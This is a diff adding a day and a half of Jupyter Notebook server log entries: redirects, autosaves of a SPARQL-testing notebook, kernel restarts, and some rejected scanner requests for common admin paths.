@@ -9320,3 +9320,1399 @@ WARNING:root:kernel b79768a2-bae3-428f-8384-04f183a4cc2c restarted
 [I 06:14:54.952 NotebookApp] 302 GET /tree? (104.155.236.207) 0.82ms
 [I 06:37:01.535 NotebookApp] 302 GET / (104.155.236.207) 0.60ms
 [I 06:37:01.791 NotebookApp] 302 GET /tree? (104.155.236.207) 0.94ms
+[I 06:59:08.528 NotebookApp] 302 GET / (104.155.236.207) 0.65ms
+[I 06:59:08.783 NotebookApp] 302 GET /tree? (104.155.236.207) 0.84ms
+[I 07:21:15.391 NotebookApp] 302 GET / (104.155.236.207) 0.54ms
+[I 07:21:15.647 NotebookApp] 302 GET /tree? (104.155.236.207) 0.94ms
+[I 07:43:22.483 NotebookApp] 302 GET / (104.155.236.207) 0.59ms
+[I 07:43:22.739 NotebookApp] 302 GET /tree? (104.155.236.207) 0.85ms
+[I 08:05:29.325 NotebookApp] 302 GET / (104.155.236.207) 0.54ms
+[I 08:05:29.581 NotebookApp] 302 GET /tree? (104.155.236.207) 0.83ms
+[I 08:18:15.255 NotebookApp] 302 GET / (88.204.59.101) 0.84ms
+[I 08:27:36.454 NotebookApp] 302 GET / (104.155.236.207) 0.47ms
+[I 08:27:36.710 NotebookApp] 302 GET /tree? (104.155.236.207) 0.83ms
+[I 08:34:39.036 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:36:40.082 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:44:39.067 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:46:39.067 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:48:39.031 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:49:10.502 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:49:43.492 NotebookApp] 302 GET / (104.155.236.207) 0.59ms
+[I 08:49:43.748 NotebookApp] 302 GET /tree? (104.155.236.207) 0.97ms
+[I 08:50:04.580 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:50:39.042 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:50:43.874 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:50:59.568 NotebookApp] Kernel restarted: a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 08:51:00.356 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 08:52:13.111 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:52:21.065 NotebookApp] Kernel restarted: a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 08:52:21.821 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 08:52:39.177 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:54:39.119 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:55:39.715 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:55:50.395 NotebookApp] Kernel restarted: a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 08:55:51.640 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 08:56:39.031 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:58:39.031 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:59:55.533 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 08:59:55.976 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:00:39.057 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:00:48.425 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:01:01.320 NotebookApp] Kernel restarted: a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 09:01:02.207 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 09:02:30.762 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:03:08.756 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:03:26.545 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:03:57.524 NotebookApp] Kernel restarted: a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 09:03:58.604 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 09:04:39.031 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:06:39.003 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:07:00.331 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:07:41.487 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:08:00.168 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:08:09.520 NotebookApp] Kernel restarted: a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 09:08:10.703 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 09:08:39.142 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:09:12.811 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:09:30.305 NotebookApp] Kernel restarted: a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 09:09:31.247 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 09:10:40.004 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:11:50.392 NotebookApp] 302 GET / (104.155.236.207) 0.57ms
+[I 09:11:50.648 NotebookApp] 302 GET /tree? (104.155.236.207) 0.89ms
+[I 09:12:34.636 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[W 09:12:40.500 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20190411101624 (80.254.184.33) 1.67ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/sparqlwrapper.testing.ipynb
+[I 09:12:43.043 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 09:12:58.954 NotebookApp] Kernel restarted: a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 09:12:59.740 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 09:14:43.228 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:15:39.480 NotebookApp] Kernel restarted: a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 09:15:40.289 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 09:16:43.220 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:17:17.746 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:17:26.198 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:18:25.852 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:18:43.232 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:20:13.392 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:20:21.741 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:20:43.166 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:28:26.438 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:28:43.245 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:29:34.075 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:30:31.796 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:30:43.420 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:31:13.128 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:32:12.608 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:32:31.613 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:32:43.494 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:33:01.275 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:33:57.263 NotebookApp] 302 GET / (104.155.236.207) 0.71ms
+[I 09:33:57.519 NotebookApp] 302 GET /tree? (104.155.236.207) 1.04ms
+[I 09:34:43.238 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:36:43.245 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:38:43.218 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:42:43.987 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:48:43.216 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 09:54:14.799 NotebookApp] 302 GET / (213.92.236.50) 0.63ms
+[I 09:56:04.297 NotebookApp] 302 GET / (104.155.236.207) 0.52ms
+[I 09:56:04.552 NotebookApp] 302 GET /tree? (104.155.236.207) 0.80ms
+[I 09:56:22.110 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 10:01:55.420 NotebookApp] 302 GET / (42.159.83.224) 0.48ms
+[I 10:02:43.204 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 10:18:11.303 NotebookApp] 302 GET / (104.155.236.207) 0.62ms
+[I 10:18:11.558 NotebookApp] 302 GET /tree? (104.155.236.207) 0.81ms
+[I 10:28:43.285 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 10:30:43.275 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 10:32:43.199 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 10:34:43.171 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 10:35:19.766 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 10:35:41.200 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 10:35:46.687 NotebookApp] Kernel restarted: a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 10:35:47.514 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 10:36:43.241 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 10:40:18.220 NotebookApp] 302 GET / (104.155.236.207) 0.58ms
+[I 10:40:18.475 NotebookApp] 302 GET /tree? (104.155.236.207) 0.89ms
+[I 11:02:26.239 NotebookApp] 302 GET / (104.155.236.207) 0.53ms
+[I 11:02:26.495 NotebookApp] 302 GET /tree? (104.155.236.207) 0.97ms
+[I 11:24:33.158 NotebookApp] 302 GET / (104.155.236.207) 0.60ms
+[I 11:24:33.414 NotebookApp] 302 GET /tree? (104.155.236.207) 0.92ms
+[I 11:34:04.382 NotebookApp] 302 GET / (216.218.206.66) 0.53ms
+[I 11:46:40.130 NotebookApp] 302 GET / (104.155.236.207) 0.48ms
+[I 11:46:40.385 NotebookApp] 302 GET /tree? (104.155.236.207) 0.84ms
+[I 12:04:43.139 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 12:04:48.616 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 12:05:12.244 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 12:06:43.123 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 12:08:47.045 NotebookApp] 302 GET / (104.155.236.207) 0.50ms
+[I 12:08:47.300 NotebookApp] 302 GET /tree? (104.155.236.207) 0.75ms
+[I 12:28:43.093 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 12:30:53.890 NotebookApp] 302 GET / (104.155.236.207) 0.50ms
+[I 12:30:54.145 NotebookApp] 302 GET /tree? (104.155.236.207) 0.88ms
+[I 12:42:43.071 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 12:42:45.992 NotebookApp] Kernel restarted: a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 12:42:46.904 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 12:44:43.901 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 12:53:00.851 NotebookApp] 302 GET / (104.155.236.207) 0.64ms
+[I 12:53:01.107 NotebookApp] 302 GET /tree? (104.155.236.207) 1.00ms
+[I 13:15:07.862 NotebookApp] 302 GET / (104.155.236.207) 0.54ms
+[I 13:15:08.118 NotebookApp] 302 GET /tree? (104.155.236.207) 0.84ms
+[I 13:37:14.869 NotebookApp] 302 GET / (104.155.236.207) 0.60ms
+[I 13:37:15.124 NotebookApp] 302 GET /tree? (104.155.236.207) 0.95ms
+[I 13:59:21.907 NotebookApp] 302 GET / (104.155.236.207) 0.51ms
+[I 13:59:22.163 NotebookApp] 302 GET /tree? (104.155.236.207) 0.92ms
+[I 13:59:39.606 NotebookApp] 302 GET / (72.249.213.173) 0.82ms
+[I 14:21:28.758 NotebookApp] 302 GET / (104.155.236.207) 0.58ms
+[I 14:21:29.014 NotebookApp] 302 GET /tree? (104.155.236.207) 0.91ms
+[I 14:22:21.177 NotebookApp] 302 GET / (103.96.51.198) 0.57ms
+[I 14:43:35.794 NotebookApp] 302 GET / (104.155.236.207) 0.51ms
+[I 14:43:36.049 NotebookApp] 302 GET /tree? (104.155.236.207) 0.83ms
+[W 14:57:59.565 NotebookApp] 404 GET http://5.188.210.101/echo.php (5.188.210.101) 1.87ms referer=https://www.google.com/
+[I 15:05:42.718 NotebookApp] 302 GET / (104.155.236.207) 0.51ms
+[I 15:05:42.974 NotebookApp] 302 GET /tree? (104.155.236.207) 0.88ms
+[W 15:12:35.524 NotebookApp] 404 GET /esps/admin/main.jspx (47.75.216.183) 1.69ms referer=None
+[I 15:27:49.573 NotebookApp] 302 GET / (104.155.236.207) 0.73ms
+[I 15:27:49.829 NotebookApp] 302 GET /tree? (104.155.236.207) 1.09ms
+[I 15:35:28.674 NotebookApp] 302 GET / (139.162.79.87) 0.52ms
+[I 15:49:56.556 NotebookApp] 302 GET / (104.155.236.207) 0.61ms
+[I 15:49:56.812 NotebookApp] 302 GET /tree? (104.155.236.207) 0.95ms
+[I 16:12:03.478 NotebookApp] 302 GET / (104.155.236.207) 0.61ms
+[I 16:12:03.733 NotebookApp] 302 GET /tree? (104.155.236.207) 1.00ms
+[I 16:14:36.613 NotebookApp] 302 GET / (143.255.0.235) 0.60ms
+[I 16:34:10.460 NotebookApp] 302 GET / (104.155.236.207) 0.56ms
+[I 16:34:10.716 NotebookApp] 302 GET /tree? (104.155.236.207) 0.82ms
+[I 16:56:17.328 NotebookApp] 302 GET / (104.155.236.207) 0.49ms
+[I 16:56:17.583 NotebookApp] 302 GET /tree? (104.155.236.207) 0.83ms
+[I 17:18:24.241 NotebookApp] 302 GET / (104.155.236.207) 0.46ms
+[I 17:18:24.497 NotebookApp] 302 GET /tree? (104.155.236.207) 0.77ms
+[I 17:18:42.894 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 17:20:42.906 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 17:38:24.115 NotebookApp] 302 GET / (91.241.53.107) 0.60ms
+[I 17:38:24.149 NotebookApp] 302 GET /tree? (91.241.53.107) 0.86ms
+[I 17:40:31.201 NotebookApp] 302 GET / (104.155.236.207) 0.51ms
+[I 17:40:31.457 NotebookApp] 302 GET /tree? (104.155.236.207) 0.79ms
+[I 17:48:42.903 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 18:02:38.067 NotebookApp] 302 GET / (104.155.236.207) 0.54ms
+[I 18:02:38.324 NotebookApp] 302 GET /tree? (104.155.236.207) 0.81ms
+[I 18:24:45.114 NotebookApp] 302 GET / (104.155.236.207) 0.79ms
+[I 18:24:45.370 NotebookApp] 302 GET /tree? (104.155.236.207) 0.86ms
+[I 18:46:52.061 NotebookApp] 302 GET / (104.155.236.207) 0.54ms
+[I 18:46:52.316 NotebookApp] 302 GET /tree? (104.155.236.207) 0.84ms
+[I 18:59:58.511 NotebookApp] 302 GET / (45.235.155.25) 0.56ms
+[I 19:08:58.978 NotebookApp] 302 GET / (104.155.236.207) 0.49ms
+[I 19:08:59.234 NotebookApp] 302 GET /tree? (104.155.236.207) 0.78ms
+[I 19:31:05.911 NotebookApp] 302 GET / (104.155.236.207) 0.55ms
+[I 19:31:06.167 NotebookApp] 302 GET /tree? (104.155.236.207) 1.21ms
+[I 19:53:12.941 NotebookApp] 302 GET / (104.155.236.207) 0.87ms
+[I 19:53:13.197 NotebookApp] 302 GET /tree? (104.155.236.207) 0.74ms
+[W 19:57:46.907 NotebookApp] WebSocket ping timeout after 119885 ms.
+[W 19:57:58.918 NotebookApp] WebSocket ping timeout after 119915 ms.
+[W 19:58:01.182 NotebookApp] WebSocket ping timeout after 119926 ms.
+[I 20:08:59.932 NotebookApp] 302 GET / (185.82.98.247) 0.58ms
+[I 20:15:19.954 NotebookApp] 302 GET / (104.155.236.207) 0.58ms
+[I 20:15:20.209 NotebookApp] 302 GET /tree? (104.155.236.207) 0.82ms
+[I 20:37:26.823 NotebookApp] 302 GET / (104.155.236.207) 0.63ms
+[I 20:37:27.078 NotebookApp] 302 GET /tree? (104.155.236.207) 0.84ms
+[I 20:59:33.766 NotebookApp] 302 GET / (104.155.236.207) 0.65ms
+[I 20:59:34.025 NotebookApp] 302 GET /tree? (104.155.236.207) 0.87ms
+[I 21:17:05.034 NotebookApp] 302 GET / (125.64.94.211) 0.76ms
+[I 21:17:05.964 NotebookApp] 302 GET /tree (125.64.94.211) 0.84ms
+[I 21:21:40.782 NotebookApp] 302 GET / (104.155.236.207) 0.48ms
+[I 21:21:41.038 NotebookApp] 302 GET /tree? (104.155.236.207) 0.78ms
+[I 21:22:22.055 NotebookApp] 302 GET / (27.123.249.198) 0.56ms
+[I 21:38:49.633 NotebookApp] 302 GET / (110.138.151.115) 0.53ms
+[I 21:43:47.740 NotebookApp] 302 GET / (104.155.236.207) 0.54ms
+[I 21:43:47.996 NotebookApp] 302 GET /tree? (104.155.236.207) 0.77ms
+[W 22:04:25.293 NotebookApp] 404 GET /manager/html (52.66.210.179) 1.67ms referer=None
+[I 22:05:54.894 NotebookApp] 302 GET / (104.155.236.207) 0.50ms
+[I 22:05:55.150 NotebookApp] 302 GET /tree? (104.155.236.207) 0.78ms
+[I 22:21:32.473 NotebookApp] 302 GET / (209.17.96.2) 0.66ms
+[I 22:28:01.828 NotebookApp] 302 GET / (104.155.236.207) 0.50ms
+[I 22:28:02.084 NotebookApp] 302 GET /tree? (104.155.236.207) 1.03ms
+[W 22:32:08.395 NotebookApp] 404 HEAD http://112.124.42.80:63435/ (60.191.52.254) 2.08ms referer=None
+[I 22:50:08.674 NotebookApp] 302 GET / (104.155.236.207) 0.67ms
+[I 22:50:08.930 NotebookApp] 302 GET /tree? (104.155.236.207) 0.94ms
+[I 23:12:15.613 NotebookApp] 302 GET / (104.155.236.207) 0.48ms
+[I 23:12:15.871 NotebookApp] 302 GET /tree? (104.155.236.207) 0.86ms
+[I 23:34:22.662 NotebookApp] 302 GET / (104.155.236.207) 0.64ms
+[I 23:34:22.921 NotebookApp] 302 GET /tree? (104.155.236.207) 0.88ms
+[I 23:43:22.259 NotebookApp] 302 GET / (177.135.5.196) 0.50ms
+[I 23:56:29.737 NotebookApp] 302 GET / (104.155.236.207) 0.48ms
+[I 23:56:29.992 NotebookApp] 302 GET /tree? (104.155.236.207) 0.81ms
+[I 00:06:22.734 NotebookApp] 302 GET / (179.110.20.40) 0.54ms
+[I 00:12:46.611 NotebookApp] 302 GET / (152.254.246.30) 0.63ms
+[I 00:18:36.570 NotebookApp] 302 GET / (104.155.236.207) 0.58ms
+[I 00:18:36.826 NotebookApp] 302 GET /tree? (104.155.236.207) 0.83ms
+[I 00:39:38.894 NotebookApp] 302 GET / (185.142.236.34) 0.49ms
+[I 00:39:38.948 NotebookApp] 302 GET /tree (185.142.236.34) 0.69ms
+[I 00:40:43.604 NotebookApp] 302 GET / (104.155.236.207) 0.47ms
+[I 00:40:43.861 NotebookApp] 302 GET /tree? (104.155.236.207) 0.83ms
+[I 01:02:50.454 NotebookApp] 302 GET / (104.155.236.207) 0.55ms
+[I 01:02:50.710 NotebookApp] 302 GET /tree? (104.155.236.207) 0.81ms
+[I 01:10:51.167 NotebookApp] 302 GET / (92.112.56.47) 0.79ms
+[I 01:24:57.573 NotebookApp] 302 GET / (104.155.236.207) 0.64ms
+[I 01:24:57.828 NotebookApp] 302 GET /tree? (104.155.236.207) 0.88ms
+[I 01:47:04.420 NotebookApp] 302 GET / (104.155.236.207) 0.51ms
+[I 01:47:04.675 NotebookApp] 302 GET /tree? (104.155.236.207) 0.75ms
+[I 01:54:58.133 NotebookApp] 302 GET / (87.26.62.19) 0.54ms
+[I 02:09:11.322 NotebookApp] 302 GET / (104.155.236.207) 0.56ms
+[I 02:09:11.578 NotebookApp] 302 GET /tree? (104.155.236.207) 0.85ms
+[I 02:31:18.516 NotebookApp] 302 GET / (104.155.236.207) 0.56ms
+[I 02:31:18.772 NotebookApp] 302 GET /tree? (104.155.236.207) 0.83ms
+[I 02:53:25.365 NotebookApp] 302 GET / (104.155.236.207) 0.50ms
+[I 02:53:25.623 NotebookApp] 302 GET /tree? (104.155.236.207) 0.79ms
+[I 03:15:32.310 NotebookApp] 302 GET / (104.155.236.207) 1.13ms
+[I 03:15:32.566 NotebookApp] 302 GET /tree? (104.155.236.207) 1.21ms
+[I 03:37:09.423 NotebookApp] 302 GET / (88.247.91.5) 0.84ms
+[I 03:37:39.495 NotebookApp] 302 GET / (104.155.236.207) 0.59ms
+[I 03:37:39.750 NotebookApp] 302 GET /tree? (104.155.236.207) 0.95ms
+[I 03:59:46.387 NotebookApp] 302 GET / (104.155.236.207) 0.54ms
+[I 03:59:46.642 NotebookApp] 302 GET /tree? (104.155.236.207) 0.79ms
+[I 04:21:53.367 NotebookApp] 302 GET / (104.155.236.207) 0.93ms
+[I 04:21:53.623 NotebookApp] 302 GET /tree? (104.155.236.207) 1.12ms
+[I 04:44:00.487 NotebookApp] 302 GET / (104.155.236.207) 0.65ms
+[I 04:44:00.743 NotebookApp] 302 GET /tree? (104.155.236.207) 0.90ms
+[I 05:06:07.527 NotebookApp] 302 GET / (104.155.236.207) 0.68ms
+[I 05:06:07.783 NotebookApp] 302 GET /tree? (104.155.236.207) 1.04ms
+[I 05:24:32.765 NotebookApp] Adapting to protocol v5.1 for kernel a5feccc7-f1d2-4221-928e-05f23b418f67
+[I 05:24:43.552 NotebookApp] Adapting to protocol v5.1 for kernel b79768a2-bae3-428f-8384-04f183a4cc2c
+[I 05:24:46.669 NotebookApp] Adapting to protocol v5.1 for kernel 8b948b07-6d67-431c-858c-9fc8ca2bfb13
+[I 05:28:14.451 NotebookApp] 302 GET / (104.155.236.207) 0.53ms
+[I 05:28:14.707 NotebookApp] 302 GET /tree? (104.155.236.207) 0.98ms
+[I 05:30:09.121 NotebookApp] 302 GET / (201.13.89.56) 0.68ms
+[I 05:50:21.471 NotebookApp] 302 GET / (104.155.236.207) 0.59ms
+[I 05:50:21.727 NotebookApp] 302 GET /tree? (104.155.236.207) 1.10ms
+[I 06:00:41.512 NotebookApp] 302 GET / (194.32.117.3) 0.75ms
+[I 06:12:28.272 NotebookApp] 302 GET / (104.155.236.207) 0.70ms
+[I 06:12:28.528 NotebookApp] 302 GET /tree? (104.155.236.207) 1.10ms
+[I 06:34:35.285 NotebookApp] 302 GET / (104.155.236.207) 0.67ms
+[I 06:34:35.541 NotebookApp] 302 GET /tree? (104.155.236.207) 1.18ms
+[I 06:49:25.053 NotebookApp] 302 GET / (45.125.118.114) 0.59ms
+[I 06:56:42.275 NotebookApp] 302 GET / (104.155.236.207) 0.75ms
+[I 06:56:42.531 NotebookApp] 302 GET /tree? (104.155.236.207) 0.99ms
+[I 07:13:48.138 NotebookApp] 302 GET / (213.37.103.7) 1.02ms
+[I 07:16:42.307 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:18:49.221 NotebookApp] 302 GET / (104.155.236.207) 0.57ms
+[I 07:18:49.477 NotebookApp] 302 GET /tree? (104.155.236.207) 0.92ms
+[I 07:20:41.521 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:20:47.160 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:20:52.762 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:21:14.418 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:22:42.370 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:26:42.378 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 07:40:56.063 NotebookApp] 302 GET / (104.155.236.207) 0.74ms
+[I 07:40:56.319 NotebookApp] 302 GET /tree? (104.155.236.207) 0.96ms
+[I 08:03:03.075 NotebookApp] 302 GET / (104.155.236.207) 0.64ms
+[I 08:03:03.330 NotebookApp] 302 GET /tree? (104.155.236.207) 1.10ms
+[I 08:20:06.413 NotebookApp] 302 GET / (103.73.182.111) 0.92ms
+[I 08:25:10.012 NotebookApp] 302 GET / (104.155.236.207) 0.71ms
+[I 08:25:10.267 NotebookApp] 302 GET /tree? (104.155.236.207) 0.98ms
+[I 08:47:16.949 NotebookApp] 302 GET / (104.155.236.207) 0.70ms
+[I 08:47:17.205 NotebookApp] 302 GET /tree? (104.155.236.207) 0.96ms
+[I 09:09:24.003 NotebookApp] 302 GET / (104.155.236.207) 0.72ms
+[I 09:09:24.258 NotebookApp] 302 GET /tree? (104.155.236.207) 1.06ms
+[I 09:31:31.062 NotebookApp] 302 GET / (104.155.236.207) 0.72ms
+[I 09:31:31.318 NotebookApp] 302 GET /tree? (104.155.236.207) 1.08ms
+[I 10:09:17.255 NotebookApp] 302 GET / (185.170.131.186) 0.87ms
+[I 11:09:48.273 NotebookApp] 302 GET / (104.155.142.205) 0.87ms
+[I 11:09:48.474 NotebookApp] 302 GET /tree? (104.155.142.205) 1.06ms
+[I 11:34:44.925 NotebookApp] 302 GET / (46.146.124.45) 1.01ms
+[I 11:47:45.441 NotebookApp] 302 GET / (104.155.181.214) 0.61ms
+[I 11:47:45.640 NotebookApp] 302 GET /tree? (104.155.181.214) 1.09ms
+[I 12:25:41.977 NotebookApp] 302 GET / (143.255.242.109) 0.73ms
+[I 13:04:40.790 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 13:05:21.754 NotebookApp] 302 GET / (104.152.52.28) 0.68ms
+[I 13:06:12.444 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 13:41:47.754 NotebookApp] 302 GET / (51.158.109.172) 0.73ms
+[I 16:33:22.546 NotebookApp] 302 GET / (184.105.247.196) 0.92ms
+[I 17:59:40.761 NotebookApp] 302 GET / (209.17.96.170) 0.74ms
+[I 18:52:28.686 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[I 18:57:48.835 NotebookApp] Saving file at /data_analysis/sparqlwrapper.testing.ipynb
+[W 19:44:32.767 NotebookApp] WebSocket ping timeout after 119808 ms.
+[W 19:44:43.554 NotebookApp] WebSocket ping timeout after 119943 ms.
+[W 19:44:46.671 NotebookApp] WebSocket ping timeout after 119889 ms.
+[I 19:57:52.241 NotebookApp] 302 GET / (71.6.199.23) 0.81ms
+[I 19:57:52.525 NotebookApp] 302 GET /tree (71.6.199.23) 1.20ms
+[I 20:14:55.059 NotebookApp] 302 GET / (200.161.39.199) 0.69ms
+[I 20:15:33.762 NotebookApp] 302 GET / (51.89.138.15) 0.52ms
+[I 20:15:33.776 NotebookApp] 302 GET /tree? (51.89.138.15) 0.92ms
+[W 20:21:33.353 NotebookApp] 404 GET /manager/html (122.112.197.81) 1.87ms referer=None
+[I 21:19:46.325 NotebookApp] 302 GET / (217.170.202.237) 0.75ms
+[I 21:19:55.785 NotebookApp] 302 GET /tree (217.170.202.237) 1.13ms
+[W 21:19:59.755 NotebookApp] 404 GET http://www.msftncsi.com/ncsi.txt (217.170.202.237) 1.68ms referer=http://104.155.55.255:8080/
+[I 21:20:21.206 NotebookApp] 302 GET /HNAP1/ (217.170.202.237) 0.58ms
+[W 21:20:21.686 NotebookApp] 404 GET /HNAP1 (217.170.202.237) 2.25ms referer=http://104.155.55.255:8080/
+[W 21:21:04.147 NotebookApp] 404 GET /hudson/script (217.170.202.237) 1.82ms referer=http://104.155.55.255:8080/
+[W 21:21:07.666 NotebookApp] 404 GET /script (217.170.202.237) 1.61ms referer=http://104.155.55.255:8080/
+[W 21:21:17.149 NotebookApp] 404 GET /sqlite/main.php (217.170.202.237) 1.58ms referer=http://104.155.55.255:8080/
